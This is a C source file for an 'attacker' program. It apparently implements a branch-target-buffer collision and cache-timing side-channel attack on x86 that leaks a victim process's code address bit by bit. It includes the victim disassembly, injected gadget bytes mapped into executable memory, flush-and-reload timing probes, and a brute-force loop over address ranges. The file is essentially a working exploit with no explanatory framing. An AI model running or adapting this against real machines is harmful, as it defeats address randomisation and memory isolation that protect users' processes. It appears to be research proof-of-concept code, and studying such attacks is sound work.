#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <sys/mman.h>
#include <sys/mman.h>
#include <signal.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <xmmintrin.h>

#define THRESHOLD 0x90
#define BTB_COLLISION_TRIALS 200


/* victim
   0x0000000000001157 <+33>:    ff c8   dec    eax
   0x0000000000001159 <+35>:    75 fc   jne    0x1157 <main+33>
   0x000000000000115b <+37>:    90      nop
   0x000000000000115c <+38>:    90      nop
   0x000000000000115d <+39>:    90      nop
   0x000000000000115e <+40>:    90      nop
   0x000000000000115f <+41>:    90      nop
   0x0000000000001160 <+42>:    90      nop
   0x0000000000001161 <+43>:    90      nop
   0x0000000000001162 <+44>:    90      nop
   0x0000000000001163 <+45>:    90      nop
   0x0000000000001164 <+46>:    90      nop
   0x0000000000001165 <+47>:    90      nop
   0x0000000000001166 <+48>:    90      nop
   0x0000000000001167 <+49>:    90      nop
   0x0000000000001168 <+50>:    90      nop
   0x0000000000001169 <+51>:    90      nop
   0x000000000000116a <+52>:    90      nop
   0x000000000000116b <+53>:    90      nop
   0x000000000000116c <+54>:    90      nop
   0x000000000000116d <+55>:    90      nop
   0x000000000000116e <+56>:    90      nop
   0x000000000000116f <+57>:    90      nop
   0x0000000000001170 <+58>:    90      nop
   0x0000000000001171 <+59>:    90      nop
   0x0000000000001172 <+60>:    90      nop
   0x0000000000001173 <+61>:    48 8d 3d b6 2e 00 00    lea    rdi,[rip+0x2eb6]        # 0x4030 <codePtr>
   0x000000000000117a <+68>:    ff 17   call   QWORD PTR [rdi]

attacker:
=> 0x455555555157:      dec    eax
   0x455555555159:      jne    0x455555555157
   0x45555555515b:      mov    rdi,QWORD PTR [rdi]
   0x45555555515e:      mov    rdi,QWORD PTR [rdi]
   0x455555555161:      mov    rdi,QWORD PTR [rdi]
   0x455555555164:      mov    rdi,QWORD PTR [rdi]
   0x455555555167:      mov    rdi,QWORD PTR [rdi]
   0x45555555516a:      mov    rdi,QWORD PTR [rdi]
   0x45555555516d:      mov    rdi,QWORD PTR [rdi]
   0x455555555170:      mov    rdi,QWORD PTR [rdi]
   0x455555555173:      mov    rdi,QWORD PTR [rdi]
   0x455555555176:      mov    rdi,QWORD PTR [rdi]
   0x455555555179:      nop
   0x45555555517a:      jmp    QWORD PTR [rdi]
*/



//modify gadget to mimic victim last branches and the call
//#define GADGET_CLONE "\xff\xc8\x75\xfc\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x90\xff\x27"
#define GADGET_CLONE "\xff\xc8\x75\xfc\x48\x8b\x3f\x48\x8b\x3f\x48\x8b\x3f\x90\xff\x27"
#define GADGET_CLONE_SIZE 16 //157

#define PTR_CHAIN_SIZE 3


void doNothing();

uint8_t *rdiPtr = (uint8_t *)doNothing;
//uint8_t *rdiPtr = (uint8_t *)0x550000000135UL;
uint8_t unused[0x1000];
uint8_t probeArray[0x3000];
uint8_t unused2[0x1000];
uint64_t ptrchain[0x200*PTR_CHAIN_SIZE];



void doNothing(){
    asm volatile (
            "mov esi,eax            \n"
            "mov ebx,edx            \n"
    		"rdtsc                  \n"
            "shl rbx, 32             \n"
            "add rbx,rsi            \n"
            "shl rdx,32             \n"
            "add rdx,rax             \n"
            "sub rdx, rbx           \n"
            "mov rax, rdx           \n"
            );
}

static inline void flush(char *adrs) 
{
    asm volatile (
		"clflush [%0]			\n"
      :
      : "c" (adrs)
      : );
}
static inline void cpuid() 
{
    asm volatile ("cpuid");
}

unsigned probe(char *adrs) 
{
	volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
		"    mfence             \n"
        "    lfence             \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

uint64_t callGadget(uint64_t code,uint64_t idx){

    volatile uint64_t time;
    asm __volatile__(
                "mov eax,200    \n"
                "mov rcx, %4    \n"
                "lea rsi, %3    \n"
                "lea rdi, %2    \n"
                "call %1        \n"
                :"=a" (time)
                : "m"(code),"m"(ptrchain),"m"(probeArray[0x1000UL]),"m"(idx)
                : "rdi"
            );
    return time;
}


float disclosure(uint64_t rwx,uint8_t idx){
    
    for(uint64_t i=0;i<(PTR_CHAIN_SIZE-1);i++){
        flush(&ptrchain[0x200*i]);
    }
    flush(&rdiPtr);
    cpuid();
    return callGadget(rwx,idx);
}




void leakAddress(uint64_t srcEntry,uint64_t dstEntry){
  
    /*
        "H\x8d\x05\xf9\xff\xff\xffH\xd3\xe8H\x83\xe0\x01H\xc1\xe0\x0c\x8a\x14\x06\xc3"
        lea rax,[rip - 7]
        shr rax,cl
        and rax,1
        shl rax,12
        mov dl,[rsi+rax]
        ret
    */
    volatile uint8_t d;
    

    //avoid COW on 0 pages
    memset(&probeArray[0],1,0x1000);
    memset(&probeArray[0x1000],2,0x1000);
    memset(&probeArray[0x2000],3,0x1000);

    //mov dl,[rsi]
    //uint8_t gadget[]="\x8a\x16\xc3";

    
    /*Seting up rwz caller page in all positions for BTB collision*/
    uint8_t * srcPage = mmap(0x455555500000UL, 0x100000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS | MAP_FIXED,-1, 0);
    if(srcPage==-1){
        perror("mmap srcPage");
        exit(1);
    }

    for(uint64_t i=0;i<0x100;i++){
        memcpy(&srcPage[srcEntry+i*0x1000UL],GADGET_CLONE,GADGET_CLONE_SIZE);
    }

    /*set up ptr chain*/
    for(uint64_t i=0;i<(PTR_CHAIN_SIZE-1);i++){
        ptrchain[0x200*i] = (uint64_t)&ptrchain[0x200*(i+1)];
    }
    ptrchain[0x200*(PTR_CHAIN_SIZE-1)] = &rdiPtr;

    /*map all possible positions with gadget*/
    int fd = open("hugepage.bin", O_RDONLY);
    uint8_t * dstPages = mmap(0x154000000000UL, 0x100000000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED,fd, 0);
    if(dstPages==-1){
            perror("mmap dstPages");
            exit(1);
    }

    /*uint8_t * dstPages = mmap(0x154000000000UL, 0x100000000UL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1, 0);
    if(dstPages==-1){
            perror("mmap dstPages");
            exit(1);
    }
    for(uint64_t i=0;i<0x100000UL;i++){
        memcpy(&dstPages[i*0x1000UL + 0x135UL],"H\x8d\x05\xf9\xff\xff\xffH\xd3\xe8H\x83\xe0\x01H\xc1\xe0\x0c\x8a\x14\x06\xc3",22);
    
    }*/

    //ensure content its on memory
    for(uint64_t i=0;i<0x10000UL;i++){
        d = dstPages[i*0x10000UL + 0x135];
    }

    
    for(uint8_t *addr=0x550000000000UL; addr<=0x570000000000UL;addr+=0x100000000UL){

        //makes page "fresh" on entry table
        dstPages = mremap(dstPages, 0x100000000UL,0x100000000UL, MREMAP_MAYMOVE | MREMAP_FIXED  , addr);
        if(dstPages==-1){
            perror("mremap dstPages");
            exit(1);
        }
        
        printf("testing allocated at %p \r",dstPages);

        
    
        unsigned hits=0;
        unsigned trials=0;
        unsigned t1,t2;
        uint64_t mask=0;
        uint64_t recoveredAddresss=0;
        unsigned multiplier=1;
        
        for(trials=0;trials<10*multiplier;trials++){
            //due to colisions, maybe its not necessary to bruteforce the entire range
            for(uint64_t i=0;i<0x100;i++){
                disclosure(&srcPage[i*0x1000UL + srcEntry],mask);
            }
            
            
            t2 = probe(&probeArray[0x2000UL]);
            t1 = probe(&probeArray[0x1000UL]);

            if ( (t1 < THRESHOLD) || (t2 < THRESHOLD)){
                multiplier=200;
                if(t1 < t2){
                    printf("-",t1);
                }
                else{
                    printf("+",t2);
                    recoveredAddresss|=(1UL << mask);
                }
                
                if(mask++==64){
                    printf("\nrecovered address %p \n",recoveredAddresss);
                    return;
                }
            }
            usleep(1);
        }

        
        
    }



   
}

int main(int argc,char **argv){
    
    
    struct timeval begint, endt;

    if (argc < 3){
        printf("Usage: ./attacker gadgetBase, offset\n");
        printf("Example: ./attacker 0x167 0x145\n");
        return 0;
    }

    uint64_t gadgetBase=(uint64_t)strtoul(argv[1],NULL,16)&0xfffff;
    uint64_t offset=(uint64_t)strtoul(argv[2],NULL,16)&0xfff;
    printf("Attacker: src: %p ->dst: %p \n",gadgetBase,offset);


    gettimeofday(&begint, 0);
    leakAddress(gadgetBase,offset);
    gettimeofday(&endt, 0);
    long seconds = endt.tv_sec - begint.tv_sec;
    long microseconds = endt.tv_usec - begint.tv_usec;
    double elapsed = seconds + microseconds*1e-6;
    
    
    printf("\nFinished at: %.3f seconds.\n", elapsed);


}